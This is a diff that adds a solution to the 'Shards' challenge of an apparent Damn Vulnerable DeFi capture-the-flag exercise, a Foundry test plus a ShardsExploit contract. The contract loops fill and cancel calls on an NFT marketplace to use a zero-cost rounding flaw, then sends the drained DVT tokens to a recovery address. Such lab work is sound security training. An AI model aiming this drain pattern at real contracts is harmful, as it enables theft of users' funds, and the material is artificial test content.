@@ -113,7 +113,10 @@ contract ShardsChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_shards() public checkSolvedByPlayer {}
+    function test_shards() public checkSolvedByPlayer {
+        ShardsExploit exploit = new ShardsExploit(marketplace, token, recovery);
+        exploit.attack(1);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -132,5 +135,28 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract ShardsExploit {
+    ShardsNFTMarketplace public immutable marketplace;
+    DamnValuableToken public immutable token;
+    address public recovery;
+
+    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
+        marketplace = _marketplace;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack(uint64 offerId) external {
+        uint256 shards = 100; // for 100 shards we have to pay 0 DVT
+
+        for (uint256 i = 0; i < 10001; i++) {
+            marketplace.fill(offerId, shards);
+            marketplace.cancel(1, i); // to DVT from shards of cancelled NFT buy
+        }
+
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
